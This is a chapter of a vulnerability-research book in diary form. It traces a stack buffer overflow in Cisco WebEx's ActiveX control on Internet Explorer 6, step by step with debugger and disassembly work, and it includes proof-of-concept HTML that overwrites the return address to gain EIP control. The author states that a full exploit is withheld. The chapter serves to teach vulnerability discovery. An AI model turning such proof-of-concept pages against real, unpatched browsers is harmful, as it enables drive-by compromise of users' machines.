<html><head></head><body><div class="chapter" title="Chapter&#xA0;5.&#xA0;Browse and You&#x2019;re Owned"><div class="titlepage"><div><div><h1 class="title"><a id="browse_and_youare_owned"/>Chapter 5. Browse and You’re Owned</h1></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Sunday, April 6, 2008</em></span><a id="IDX-CHP-5-0001" class="indexterm"/></p><p><span class="emphasis"><em>Dear Diary</em></span>,</p></div><p>Vulnerabilities in browsers and browser add-ons are all the rage these days, so I decided to have a look at some ActiveX controls. The first one on my list was Cisco’s online meeting and web-conferencing software called WebEx, which is widely used in business. After spending some time reverse engineering the WebEx ActiveX control for Microsoft’s Internet Explorer, I found an obvious bug that I could have found in a few seconds if I had fuzzed the control instead of reading the assembly. Fail. <span class="inlinemediaobject"><a id="I_inlinemediaobject5_d1e5037"/><img src="httpatomoreillycomsourcenostarchimages939227.png" alt=""/></span><a id="IDX-CHP-5-0002" class="indexterm"/><a id="IDX-CHP-5-0003" class="indexterm"/><a id="IDX-CHP-5-0004" class="indexterm"/></p><div class="sect1" title="5.1 Vulnerability Discovery"><div class="titlepage"><div><div><h1 class="title"><a id="vulnerability_discovery-id3"/>5.1 Vulnerability Discovery</h1></div></div></div><p>I used the following process to search for a vulnerability:</p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>I used Windows XP SP3 32-bit and Internet Explorer 6 as the platform for all the following steps</em></span>.<a id="IDX-CHP-5-0005" class="indexterm"/></p></div><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Step 1: List the registered WebEx objects and exported methods.</p></li><li class="listitem"><p>Step 2: Test the exported methods in the browser.</p></li><li class="listitem"><p>Step 3: Find the object methods in the binary.</p></li><li class="listitem"><p>Step 4: Find the user-controlled input values.</p></li><li class="listitem"><p>Step 5: Reverse engineer the object methods.</p></li></ul></div><div class="note" title="Note"><h3 class="title">Note</h3><p>A download link for the vulnerable version of WebEx Meeting Manager can be found at <a class="ulink" href="http://www.trapkit.de/books/bhd/">http://www.trapkit.de/books/bhd/</a>.</p></div><div class="sect2" title="Step 1: List the Registered WebEx Objects and Exported Methods"><div class="titlepage"><div><div><h2 class="title"><a id="step_1_colon_list_the_registered_webex_o"/>Step 1: List the Registered WebEx Objects and Exported Methods</h2></div></div></div><p>After downloading and installing the WebEx Meeting Manager software, I fired up COMRaider<sup>[<a href="ch05s05.html#ftn.CHP-5-FN-1" class="footnoteref">45</a>]</sup> to generate a list of the exported interfaces the control provides to the caller. I clicked the <span class="strong"><strong>Start</strong></span> button in COMRaider and selected <span class="strong"><strong>Scan a directory for registered COM servers</strong></span> to test the WebEx components installed in <span class="emphasis"><em>C:\Program Files\Webex\</em></span>.<a id="IDX-CHP-5-0006" class="indexterm"/></p><p>As <a class="xref" href="ch05.html#registered_webex_objects_in_comraider" title="Figure 5-1. Registered WebEx objects in COMRaider">Figure 5-1</a> illustrates, two objects are registered in the WebEx install directory, and the object with GUID <code class="literal">{32E26FD9-F435-4A20-A561-35D4B987CFDC}</code> and ProgID <code class="literal">WebexUCFObject.WebexUCFObject.1</code> implements <code class="literal">IObjectSafety</code>. Internet Explorer will trust this object since it’s marked as <span class="emphasis"><em>safe for initialization</em></span> and <span class="emphasis"><em>safe for scripting</em></span>. That makes the object a promising target for “browse and you’re owned” attacks, since it’s possible to call its methods from within a web page.<sup>[<a href="ch05s05.html#ftn.CHP-5-FN-2" class="footnoteref">46</a>]</sup></p><div class="figure"><a id="registered_webex_objects_in_comraider"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject5_d1e5128"/><img src="httpatomoreillycomsourcenostarchimages939281.png.jpg" alt="Registered WebEx objects in COMRaider"/></div></div><p class="title">Figure 5-1. Registered WebEx objects in COMRaider</p></div><p>Microsoft also provides a handy C# class called <code class="literal">ClassId.cs</code><sup>[<a href="ch05s05.html#ftn.CHP-5-FN-3" class="footnoteref">47</a>]</sup> that lists various properties of ActiveX controls. To use that class, I added the following lines to the source file and compiled it with the command-line version of Visual Studio’s C# compiler (<code class="literal">csc</code>):</p><a id="I_programlisting5_d1e5142"/><pre class="programlisting">[..]
namespace ClassId
{
    class ClassId
    {
        static void Main(string[] args)
        {
            SWI.ClassId_q.ClassId clsid = new SWI.ClassId_q.ClassId();

            if (args.Length == 0 || (args[0].Equals("/?") == true ||
                args[0].ToLower().StartsWith("-h") == true) ||
                args.Length &lt; 1)
            {
                Console.WriteLine("Usage: ClassID.exe &lt;CLSID&gt;\n");
                return;
            }

            clsid.set_clsid(args[0]);
            System.Console.WriteLine(clsid.ToString());
        }
    }
}</pre><p>To compile and use the tool, I ran the following commands in a command-prompt window:</p><a id="I_programlisting5_d1e5146"/><pre class="programlisting">C:\Documents and Settings\tk\Desktop&gt;<strong class="userinput"><code>csc /warn:0 /nologo ClassId.cs</code></strong>
C:\Documents and Settings\tk\Desktop&gt;
<strong class="userinput"><code>ClassId.exe {32E26FD9-F435-4A20-A561-35D4B987CFDC}</code></strong>
Clsid: {32E26FD9-F435-4A20-A561-35D4B987CFDC}
Progid: WebexUCFObject.WebexUCFObject.1
Binary Path: C:\Program Files\WebEx\WebEx\824\atucfobj.dll
<strong class="userinput"><code>Implements IObjectSafety: True</code></strong>
<strong class="userinput"><code>Safe For Initialization (IObjectSafety): True</code></strong>
<strong class="userinput"><code>Safe For Scripting (IObjectSafety): True</code></strong>
Safe For Initialization (Registry): False
Safe For Scripting (Registry): False
KillBitted: False</pre><p>The output of the tool shows that the object was indeed marked as <span class="emphasis"><em>safe for initialization</em></span> and <span class="emphasis"><em>safe for scripting</em></span> using <code class="literal">IObjectSafety</code>.</p><p>I then clicked the <span class="strong"><strong>Select</strong></span> button in COMRaider to see a list of the public methods exported by the object with GUID <code class="literal">{32E26FD9-F435-4A20-A561-35D4B987CFDC}</code>. As illustrated in <a class="xref" href="ch05.html#public_methods_exported_by_the_object_wi" title="Figure 5-2. Public methods exported by the object with GUID {32E26FD9-F435-4A20-A561-35D4B987CFDC}.">Figure 5-2</a>, a method called <code class="literal">NewObject()</code> is exported by the object and takes a string value as input.</p><div class="figure"><a id="public_methods_exported_by_the_object_wi"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject5_d1e5193"/><img src="httpatomoreillycomsourcenostarchimages939283.png.jpg" alt="Public methods exported by the object with GUID {32E26FD9-F435-4A20-A561-35D4B987CFDC}."/></div></div><p class="title">Figure 5-2. Public methods exported by the object with GUID <code class="literal">{32E26FD9-F435-4A20-A561-35D4B987CFDC}</code>.</p></div></div><div class="sect2" title="Step 2: Test the Exported Methods in the Browser"><div class="titlepage"><div><div><h2 class="title"><a id="step_2_colon_test_the_exported_methods_i"/>Step 2: Test the Exported Methods in the Browser</h2></div></div></div><p>After I generated lists of the available objects and exported methods, I wrote a little HTML file that calls the <code class="literal">NewObject()</code> method with the help of VBScript:<a id="IDX-CHP-5-0007" class="indexterm"/></p><div class="example"><a id="html_file_to_call_the"/><p class="title">Example 5-1. HTML file to call the <code class="literal">NewObject()</code> method (<span class="emphasis"><em>webex_poc1.html</em></span>)</p><div class="example-contents"><pre class="programlisting">01    &lt;html&gt;
02     &lt;title&gt;WebEx PoC 1&lt;/title&gt;
03     &lt;body&gt;
04      &lt;object classid="clsid:32E26FD9-F435-4A20-A561-
35D4B987CFDC" id="obj"&gt;&lt;/object&gt;
05      &lt;script language='vbscript'&gt;
06        arg = String(12, "A")
07        obj.NewObject arg
08      &lt;/script&gt;
09     &lt;/body&gt;
10    &lt;/html&gt;</pre></div></div><p>In line 4 of <a class="xref" href="ch05.html#html_file_to_call_the" title="Example 5-1. HTML file to call the NewObject() method (webex_poc1.html)">Example 5-1</a>, the object with GUID or ClassID <code class="literal">{32E26FD9-F435-4A20-A561-35D4B987CFDC}</code> is instantiated. In line 7 the <code class="literal">NewObject()</code> method is called with a string value of 12 As as a parameter.</p><p>To test the HTML file, I implemented a little web server in Python that would serve the <span class="emphasis"><em>webex_poc1.html</em></span> file to the browser (see <a class="xref" href="ch05.html#simple_web_server_implemented" title="Example 5-2. Simple web server implemented in Python that serves the webex_poc1.html file to the browser (wwwserv.py)">Example 5-2</a>):<a id="IDX-CHP-5-0008" class="indexterm"/></p><div class="example"><a id="simple_web_server_implemented"/><p class="title">Example 5-2. Simple web server implemented in Python that serves the <span class="emphasis"><em>webex_poc1.html</em></span> file to the browser (<span class="emphasis"><em>wwwserv.py</em></span>)</p><div class="example-contents"><pre class="programlisting">01    import string,cgi
02    from os import curdir, sep
03    from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
04
05    class WWWHandler(BaseHTTPRequestHandler):
06
07       def do_GET(self):
08           try:
09               f = open(curdir + sep + "webex_poc1.html")
10
11               self.send_response(200)
12               self.send_header('Content-type', 'text/html')
13               self.end_headers()
14               self.wfile.write(f.read())
15               f.close()
16
17               return
18
19           except IOError:
20               self.send_error(404,'File Not Found: %s' % self.path)
21
22    def main():
23       try:
24           server = HTTPServer(('', 80), WWWHandler)
25           print 'server started'
26           server.serve_forever()
27       except KeyboardInterrupt:
28           print 'shutting down server'
29           server.socket.close()
30
31    if __name__ == '__main__':
32       main()</pre></div></div><p>While the ActiveX control of WebEx is marked as safe for scripting (see <a class="xref" href="ch05.html#registered_webex_objects_in_comraider" title="Figure 5-1. Registered WebEx objects in COMRaider">Figure 5-1</a>), it has been designed so that it can be run only from the <a class="ulink" href="http://webex.com">webex.com</a> domain. In practice, this requirement can be bypassed with the help of a <span class="emphasis"><em>Cross-Site Scripting (XSS)</em></span><sup>[<a href="ch05s05.html#ftn.CHP-5-FN-4" class="footnoteref">48</a>]</sup> vulnerability in the WebEx domain. Since XSS vulnerabilities are quite common in modern web applications, it shouldn’t be hard to identify such a vulnerability in the <a class="ulink" href="http://webex.com">webex.com</a> domain. To test the control without the need of an XSS vulnerability, I just added the following entry to my Windows <code class="literal">hosts</code> file (see <span class="emphasis"><em>C:\WINDOWS\system32\drivers\etc\hosts\</em></span>):<a id="IDX-CHP-5-0009" class="indexterm"/><a id="IDX-CHP-5-0010" class="indexterm"/></p><a id="I_programlisting5_d1e5278"/><pre class="programlisting">127.0.0.1       localhost, <strong class="userinput"><code>www.webex.com</code></strong></pre><p>After that, I started my little Python web server and pointed Internet Explorer to <a class="ulink" href="http://www.webex.com/">http://www.webex.com/</a> (see <a class="xref" href="ch05.html#testing_webex_underscore_poc1.html_with" title="Figure 5-3. Testing webex_poc1.html with my little Python web server">Figure 5-3</a>).</p><div class="figure"><a id="testing_webex_underscore_poc1.html_with"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject5_d1e5294"/><img src="httpatomoreillycomsourcenostarchimages939285.png.jpg" alt="Testing webex_poc1.html with my little Python web server"/></div></div><p class="title">Figure 5-3. Testing <span class="emphasis"><em>webex_poc1.html</em></span> with my little Python web server</p></div></div><div class="sect2" title="Step 3: Find the Object Methods in the Binary"><div class="titlepage"><div><div><h2 class="title"><a id="step_3_colon_find_the_object_methods_in"/>Step 3: Find the Object Methods in the Binary</h2></div></div></div><p>So far I had collected the following information:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>There is a WebEx object with ClassID <code class="literal">{32E26FD9-F435-4A20-A561-35D4B987CFDC}</code>.</p></li><li class="listitem"><p>This object implements <code class="literal">IObjectSafety</code> and is therefore a promising target, since its methods can be called from within the browser.</p></li><li class="listitem"><p>The object exports a method called <code class="literal">NewObject()</code> that takes a user-controlled string value as input.</p></li></ul></div><p>To reverse engineer the exported <code class="literal">NewObject()</code> method, I had to find it in the binary <code class="literal">atucfobj.dll</code>. To achieve this, I used a technique similar to the one Cody Pierce describes in one of his great MindshaRE articles.<sup>[<a href="ch05s05.html#ftn.CHP-5-FN-5" class="footnoteref">49</a>]</sup> The general idea is to extract the addresses of the invoked methods from the arguments of <code class="literal">OLEAUT32!DispCallFunc</code> while debugging the browser.<a id="IDX-CHP-5-0011" class="indexterm"/></p><p>If a method of an ActiveX control gets invoked, the <code class="literal">DispCallFunc()</code><sup>[<a href="ch05s05.html#ftn.CHP-5-FN-6" class="footnoteref">50</a>]</sup> function usually performs the actual call. This function is exported by <code class="literal">OLEAUT32.dll</code>. The address of the invoked method can be determined with the help of the first two parameters (called <code class="literal">pvInstance</code> and <code class="literal">oVft</code>) of <code class="literal">DispCallFunc()</code>.<a id="IDX-CHP-5-0012" class="indexterm"/></p><p>To find the address of the <code class="literal">NewObject()</code> method, I started Internet Explorer from within WinDbg<sup>[<a href="ch05s05.html#ftn.CHP-5-FN-7" class="footnoteref">51</a>]</sup> (also see Section B.2 for a description of the debugger commands) and set the following breakpoint at <code class="literal">OLEAUT32!DispCallFunc</code> (see also <a class="xref" href="ch05.html#defining_a_breakpoint_at_oleaut32_exclam" title="Figure 5-4. Defining a breakpoint at OLEAUT32!DispCallFunc in Internet Explorer">Figure 5-4</a>):<a id="IDX-CHP-5-0013" class="indexterm"/><a id="IDX-CHP-5-0014" class="indexterm"/></p><a id="I_programlisting5_d1e5381"/><pre class="programlisting">0:000&gt; <strong class="userinput"><code>bp OLEAUT32!DispCallFunc "u poi(poi(poi(esp+4))+(poi(esp+8))) L1;gc"</code></strong></pre><p>The debugger command <code class="literal">bp OLEAUT32!DispCallFunc</code> defines a breakpoint at the beginning of <code class="literal">DispCallFunc()</code>. If the breakpoint is triggered, the first two parameters of the function are evaluated. The first function parameter is referenced using the command <code class="literal">poi(poi(esp+4))</code>, and the second parameter is referenced by <code class="literal">poi(esp+8)</code>. These values are added together, and their sum represents the address of the invoked method. Subsequently, the first line (<code class="literal">L1</code>) of the method’s disassembly is printed to the screen (<code class="literal">u poi(result of the computation)</code>), and the execution of the control is resumed (<code class="literal">gc</code>).</p><p>I then started Internet Explorer with the <code class="literal">g</code> (Go) command of WinDbg and navigated to <a class="ulink" href="http://www.webex.com/">http://www.webex.com/</a> again. As expected, the breakpoint triggered in WinDbg showed the memory address of the called <code class="literal">NewObject()</code> method in <code class="literal">atucfobj.dll</code>.</p><p>As illustrated in <a class="xref" href="ch05.html#windbg_showing_the_memory_address_of_the" title="Figure 5-5. WinDbg showing the memory address of the NewObject() method">Figure 5-5</a>, the memory address of the <code class="literal">NewObject()</code> method was <code class="literal">0x01d5767f</code> in this example. The <code class="literal">atucfobj.dll</code> itself was loaded at address <code class="literal">0x01d50000</code> (see <code class="literal">ModLoad: 01d50000 01d69000 C:\Program Files\WebEx\WebEx\824\atucfobj.dll</code> in <a class="xref" href="ch05.html#windbg_showing_the_memory_address_of_the" title="Figure 5-5. WinDbg showing the memory address of the NewObject() method">Figure 5-5</a>). So the offset of <code class="literal">NewObject()</code> in <code class="literal">atucfobj.dll</code> was <code class="literal">0x01d5767f - 0x01d50000 = 0x767F</code>.</p><div class="figure"><a id="defining_a_breakpoint_at_oleaut32_exclam"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject5_d1e5459"/><img src="httpatomoreillycomsourcenostarchimages939287.png.jpg" alt="Defining a breakpoint at OLEAUT32!DispCallFunc in Internet Explorer"/></div></div><p class="title">Figure 5-4. Defining a breakpoint at <code class="literal">OLEAUT32!DispCallFunc</code> in Internet Explorer</p></div><div class="figure"><a id="windbg_showing_the_memory_address_of_the"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject5_d1e5471"/><img src="httpatomoreillycomsourcenostarchimages939289.png.jpg" alt="WinDbg showing the memory address of the NewObject() method"/></div></div><p class="title">Figure 5-5. WinDbg showing the memory address of the <code class="literal">NewObject()</code> method</p></div></div><div class="sect2" title="Step 4: Find the User-Controlled Input Values"><div class="titlepage"><div><div><h2 class="title"><a id="step_4_colon_find_the_user-controlled_in"/>Step 4: Find the User-Controlled Input Values</h2></div></div></div><p>Next, I disassembled the binary <span class="emphasis"><em>C:\Program Files\WebEx\WebEx\824\atucfobj.dll</em></span> with IDA Pro.<sup>[<a href="ch05s05.html#ftn.CHP-5-FN-8" class="footnoteref">52</a>]</sup> In IDA, the imagebase of <code class="literal">atucfobj.dll</code> was <code class="literal">0x10000000</code>. So <code class="literal">NewObject()</code> was located at address <code class="literal">0x1000767f</code> (imagebase + offset of <code class="literal">NewObject()</code>: <code class="literal">0x10000000 + 0x767F</code>) in the disassembly (see <a class="xref" href="ch05.html#disassembly_of_the_newobject_open_parent" title="Figure 5-6. Disassembly of the NewObject() method in IDA Pro">Figure 5-6</a>).<a id="IDX-CHP-5-0015" class="indexterm"/><a id="IDX-CHP-5-0016" class="indexterm"/></p><div class="figure"><a id="disassembly_of_the_newobject_open_parent"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject5_d1e5519"/><img src="httpatomoreillycomsourcenostarchimages939291.png.jpg" alt="Disassembly of the NewObject() method in IDA Pro"/></div></div><p class="title">Figure 5-6. Disassembly of the <code class="literal">NewObject()</code> method in IDA Pro</p></div><p>Before I started reading the assembly, I had to ensure what function argument holds the user-controlled string value provided through the VBScript in <a class="xref" href="ch05.html#html_file_to_call_the" title="Example 5-1. HTML file to call the NewObject() method (webex_poc1.html)">Example 5-1</a>. Since the argument is a string, I guessed that my value was being held in the second parameter, <code class="literal">lpWideCharStr</code>, shown in IDA. I wanted to be sure, however, so I defined a new breakpoint at the <code class="literal">NewObject()</code> method and had a look at the arguments in the debugger (see Section B.2 for a description of the following debugger commands).</p><p>As illustrated in <a class="xref" href="ch05.html#user-controlled_argument_of_newobject_op" title="Figure 5-7. User-controlled argument of NewObject() after defining a new breakpoint">Figure 5-7</a>, I defined the new breakpoint at the address of <code class="literal">NewObject()</code> (<code class="literal">0:009&gt; bp 01d5767f</code>), continued the execution of Internet Explorer (<code class="literal">0:009&gt; g</code>), and again navigated to the <a class="ulink" href="http://www.webex.com/">http://www.webex.com/</a> domain. When the breakpoint was triggered, I inspected the value of the second function argument of <code class="literal">NewObject()</code> (<code class="literal">0:000&gt; dd poi(esp+8)</code> and <code class="literal">0:000&gt; du poi(esp+8)</code>). As the debugger output shows, the user-controlled data (a wide-character string consisting of 12 As) was indeed passed to the function through the second argument.</p><p>Finally, I had all information I needed to start auditing the method for security bugs.</p><div class="figure"><a id="user-controlled_argument_of_newobject_op"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject5_d1e5567"/><img src="httpatomoreillycomsourcenostarchimages939293.png.jpg" alt="User-controlled argument of NewObject() after defining a new breakpoint"/></div></div><p class="title">Figure 5-7. User-controlled argument of <code class="literal">NewObject()</code> after defining a new breakpoint</p></div></div><div class="sect2" title="Step 5: Reverse Engineer the Object Methods"><div class="titlepage"><div><div><h2 class="title"><a id="step_5_colon_reverse_engineer_the_object"/>Step 5: Reverse Engineer the Object Methods</h2></div></div></div><p>To recap, I found an obvious vulnerability that happens while the ActiveX control processes the user-supplied string value that gets passed to <code class="literal">NewObject()</code>. <a class="xref" href="ch05.html#code_path_to_reach_the_vulnerable_functi" title="Figure 5-8. Code path to reach the vulnerable function (created in IDA Pro)">Figure 5-8</a> illustrates the code path to reach the vulnerable function.</p><div class="figure"><a id="code_path_to_reach_the_vulnerable_functi"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject5_d1e5585"/><img src="httpatomoreillycomsourcenostarchimages939295.png.jpg" alt="Code path to reach the vulnerable function (created in IDA Pro)"/></div></div><p class="title">Figure 5-8. Code path to reach the vulnerable function (created in IDA Pro)</p></div><p>In <code class="literal">sub_1000767F</code> the user-provided wide-character string is converted to a character string using the <code class="literal">WideCharToMultiByte()</code> function. After that, <code class="literal">sub_10009642</code> is called, and the user-controlled character string is copied into another buffer. The code in <code class="literal">sub_10009642</code> allows a maximum of 256 user-controlled bytes to be copied into this new character buffer (pseudo C code: <code class="literal">strncpy (new_buffer, user_controlled_string, 256)</code>). The function <code class="literal">sub_10009826</code> is called, and it calls <code class="literal">sub_100096D0</code>, which then calls the vulnerable function <code class="literal">sub_1000B37D</code>.</p><div class="example"><a id="disassembly_of_the_vulnerable"/><p class="title">Example 5-3. Disassembly of the vulnerable function <code class="literal">sub_1000B37D</code> (created in IDA Pro)</p><div class="example-contents"><pre class="programlisting">[..]
.text:1000B37D ; int __cdecl sub_1000B37D(<strong class="userinput"><code>DWORD cbData</code></strong>,
 LPBYTE lpData, int, int, int)
.text:1000B37D sub_1000B37D proc near
.text:1000B37D
<strong class="userinput"><code>.text:1000B37D SubKey= byte ptr −10Ch</code></strong>
.text:1000B37D Type= dword ptr −8
.text:1000B37D hKey= dword ptr −4
.text:1000B37D cbData= dword ptr  8
.text:1000B37D lpData= dword ptr  0Ch
.text:1000B37D arg_8= dword ptr  10h
.text:1000B37D arg_C= dword ptr  14h
.text:1000B37D arg_10= dword ptr  18h
.text:1000B37D
.text:1000B37D push   ebp
.text:1000B37E mov    ebp, esp
.text:1000B380 sub    esp, 10Ch
.text:1000B386 push   edi
<strong class="userinput"><code>.text:1000B387 lea    eax, [ebp+SubKey] ; the address of SubKey is saved in eax</code></strong>
<strong class="userinput"><code>.text:1000B38D push   [ebp+cbData]      ; 4th parameter of sprintf(): cbData</code></strong>
.text:1000B390 xor    edi, edi
<strong class="userinput"><code>.text:1000B392 push   offset aAuthoring ; 3rd parameter of sprintf(): "Authoring"</code></strong>
<strong class="userinput"><code>.text:1000B397 push   offset aSoftwareWebexU ;</code></strong>
 <strong class="userinput"><code>2nd parameter of sprintf(): "SOFTWARE\\..</code></strong>
<strong class="userinput"><code>.text:1000B397                         ; ..Webex\\UCF\\Components\\%s\\%s\\Install"</code></strong>
<strong class="userinput"><code>.text:1000B39C push   eax              ; 1st parameter of</code></strong>
 <strong class="userinput"><code>sprintf(): address of SubKey</code></strong>
<strong class="userinput"><code>.text:1000B39D call   ds:sprintf       ; call to sprintf()</code></strong>
[..]
<strong class="userinput"><code>.data:10012228 ; char aSoftwareWebexU[]</code></strong>
<strong class="userinput"><code>.data:10012228 aSoftwareWebexU db 'SOFTWARE\Webex\UCF\Components\%s\%s\Install',0</code></strong>
[..]</pre></div></div><p>The first argument of <code class="literal">sub_1000B37D</code>, called <code class="literal">cbData</code>, holds a pointer to the user-controlled data stored in the new character buffer (see <code class="literal">new_buffer</code> in the description of <a class="xref" href="ch05.html#code_path_to_reach_the_vulnerable_functi" title="Figure 5-8. Code path to reach the vulnerable function (created in IDA Pro)">Figure 5-8</a>). As I said before, the user-controlled wide-character data is stored in this new buffer as a character string with a maximum length of 256 bytes. <a class="xref" href="ch05.html#disassembly_of_the_vulnerable" title="Example 5-3. Disassembly of the vulnerable function sub_1000B37D (created in IDA Pro)">Example 5-3</a> shows that the <code class="literal">sprintf()</code> function at address <code class="literal">.text:1000B39D</code> copies the user-controlled data pointed to by <code class="literal">cbData</code> into a stack buffer called <code class="literal">SubKey</code> (see <code class="literal">.text:1000B387</code> and <code class="literal">.text:1000B39C</code>).<a id="IDX-CHP-5-0017" class="indexterm"/></p><p>Next, I tried to retrieve the size of this <code class="literal">SubKey</code> stack buffer. I opened IDA Pro’s default stack frame displays by pressing <span class="keycap">ctrl-k</span>. As shown in <a class="xref" href="ch05.html#determining_the_size_of_the_subkey_stack" title="Figure 5-9. Determining the size of the SubKey stack buffer using IDA Pro’s default stack frame displays">Figure 5-9</a>, the stack buffer <code class="literal">SubKey</code> has a fixed size of 260 bytes. If the information from the disassembly shown in <a class="xref" href="ch05.html#disassembly_of_the_vulnerable" title="Example 5-3. Disassembly of the vulnerable function sub_1000B37D (created in IDA Pro)">Example 5-3</a> is combined with the information on the stack layout of the vulnerable function, the call to <code class="literal">sprintf()</code> can be expressed with the C code in <a class="xref" href="ch05.html#pseudo_c_code_of_the_vulnerable_call" title="Example 5-4. Pseudo C code of the vulnerable call to sprintf()">Example 5-4</a>.<a id="IDX-CHP-5-0018" class="indexterm"/></p><div class="figure"><a id="determining_the_size_of_the_subkey_stack"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject5_d1e5734"/><img src="httpatomoreillycomsourcenostarchimages939297.png.jpg" alt="Determining the size of the SubKey stack buffer using IDA Pro’s default stack frame displays"/></div></div><p class="title">Figure 5-9. Determining the size of the <code class="literal">SubKey</code> stack buffer using IDA Pro’s default stack frame displays</p></div><div class="example"><a id="pseudo_c_code_of_the_vulnerable_call"/><p class="title">Example 5-4. Pseudo C code of the vulnerable call to <code class="literal">sprintf()</code></p><div class="example-contents"><pre class="programlisting">[..]
int
sub_1000B37D(DWORD cbData, LPBYTE lpData, int val1, int val2, int val3)
{
  char SubKey[260];

  sprintf(&amp;SubKey, "SOFTWARE\\Webex\\UCF\\Components\\%s\\%s\\Install",
          "Authoring", cbData);
[..]</pre></div></div><p>The <code class="literal">sprintf()</code> library function copies the user-controlled data from <code class="literal">cbData</code> as well as the string “<code class="literal">Authoring</code>” (9 bytes) and the format string (39 bytes) into <code class="literal">SubKey</code>. If <code class="literal">cbData</code> is filled with the maximum amount of user-controlled data (256 bytes), a total of 304 bytes of data will be copied into the stack buffer. <code class="literal">SubKey</code> can only hold up to 260 bytes, and <code class="literal">sprintf()</code> doesn’t perform any length check. Therefore, as shown in <a class="xref" href="ch05.html#diagram_of_the_stack_buffer_overflow_tha" title="Figure 5-10. Diagram of the stack buffer overflow that occurs when an overly long string is passed to NewObject()">Figure 5-10</a>, it’s possible to write user-controlled data out of the bounds of <code class="literal">SubKey</code>, which leads to a stack buffer overflow (see Section A.1).</p><div class="figure"><a id="diagram_of_the_stack_buffer_overflow_tha"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject5_d1e5780"/><img src="httpatomoreillycomsourcenostarchimages939299.png.jpg" alt="Diagram of the stack buffer overflow that occurs when an overly long string is passed to NewObject()"/></div></div><p class="title">Figure 5-10. Diagram of the stack buffer overflow that occurs when an overly long string is passed to <code class="literal">NewObject()</code></p></div></div></div></div>
<div class="sect1" title="5.2 Exploitation"><div class="titlepage"><div><div><h1 class="title"><a id="exploitation-id3"/>5.2 Exploitation</h1></div></div></div><p>After I found the vulnerability, exploitation was easy. All I had to do was tweak the length of the string argument supplied to <code class="literal">NewObject()</code> to overflow the stack buffer and gain control of the return address of the current stack frame.</p><p>As illustrated in <a class="xref" href="ch05.html#determining_the_size_of_the_subkey_stack" title="Figure 5-9. Determining the size of the SubKey stack buffer using IDA Pro’s default stack frame displays">Figure 5-9</a>, the distance from the <code class="literal">SubKey</code> buffer to the saved return address on the stack is 272 bytes (the offset of the saved return address (<code class="literal">+00000004</code>) minus the offset of <code class="literal">SubKey</code> (<code class="literal">−0000010C</code>): <code class="literal">0x4 - −0x10c = 0x110</code> (272)). I also had to account for the fact that the string “<code class="literal">Authoring</code>” and part of the format string will be copied into <code class="literal">SubKey</code> right before the user-controlled data (see <a class="xref" href="ch05.html#diagram_of_the_stack_buffer_overflow_tha" title="Figure 5-10. Diagram of the stack buffer overflow that occurs when an overly long string is passed to NewObject()">Figure 5-10</a>). All in all I had to subtract 40 bytes (“<code class="literal">SOFTWARE\Webex\UCF\Components\Authoring\</code>”) from the distance between <code class="literal">SubKey</code> and the saved return address (272 – 40 = 232). So I had to provide 232 bytes of dummy data to fill the stack and reach the saved return address. The following 4 bytes of the user-controlled data should then overwrite the value of the saved return address on the stack.</p><p>So I changed the number of supplied characters in line 6 of <span class="emphasis"><em>webex_poc1.html</em></span> and named the new file <span class="emphasis"><em>webex_poc2.html</em></span> (see <a class="xref" href="ch05s02.html#html_file_that_passes_an_overly" title="Example 5-5. HTML file that passes an overly long string to the NewObject() method (webex_poc2.html)">Example 5-5</a>):</p><div class="example"><a id="html_file_that_passes_an_overly"/><p class="title">Example 5-5. HTML file that passes an overly long string to the <code class="literal">NewObject()</code> method (<span class="emphasis"><em>webex_poc2.html</em></span>)</p><div class="example-contents"><pre class="programlisting">01    &lt;html&gt;
02     &lt;title&gt;WebEx PoC 2&lt;/title&gt;
03     &lt;body&gt;
04      &lt;object classid="clsid:32E26FD9-F435-4A20-A561-35D4B987CFDC"
 id="obj"&gt;&lt;/object&gt;
05      &lt;script language='vbscript'&gt;
<strong class="userinput"><code>06         arg = String(232, "A") + String(4, "B")</code></strong>
07         obj.NewObject arg
08      &lt;/script&gt;
09     &lt;/body&gt;
10    &lt;/html&gt;</pre></div></div><p>Then, I adjusted the little Python web server to serve the new HTML file.<a id="IDX-CHP-5-0019" class="indexterm"/><a id="IDX-CHP-5-0020" class="indexterm"/></p><p>The original <span class="emphasis"><em>wwwserv.py</em></span>:</p><a id="I_programlisting5_d1e5866"/><pre class="programlisting">09            f = open(curdir + sep + "<strong class="userinput"><code>webex_poc1.html</code></strong>")</pre><p>The adjusted <span class="emphasis"><em>wwwserv.py</em></span>:</p><a id="I_programlisting5_d1e5876"/><pre class="programlisting">09            f = open(curdir + sep + "<strong class="userinput"><code>webex_poc2.html</code></strong>")</pre><p>I restarted the web server, loaded Internet Explorer in WinDbg, and navigated to <a class="ulink" href="http://www.webex.com/">http://www.webex.com/</a> again.</p><p>As illustrated in <a class="xref" href="ch05s02.html#eip_control_of_internet_explorer" title="Figure 5-11. EIP control of Internet Explorer">Figure 5-11</a>, I now had full control over <code class="literal">EIP</code>. The bug could be easily exploited for arbitrary code execution using the well-known heap spraying technique.</p><div class="figure"><a id="eip_control_of_internet_explorer"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject5_d1e5898"/><img src="httpatomoreillycomsourcenostarchimages939301.png.jpg" alt="EIP control of Internet Explorer"/></div></div><p class="title">Figure 5-11. <code class="literal">EIP</code> control of Internet Explorer</p></div><p>As usual, German laws prevent me from providing a full working exploit, but if you’re interested, you can watch a short video I recorded that shows the exploit in action on the book’s website.<sup>[<a href="ch05s05.html#ftn.CHP-5-FN-9" class="footnoteref">53</a>]</sup><a id="IDX-CHP-5-0021" class="indexterm"/><a id="IDX-CHP-5-0022" class="indexterm"/><a id="IDX-CHP-5-0023" 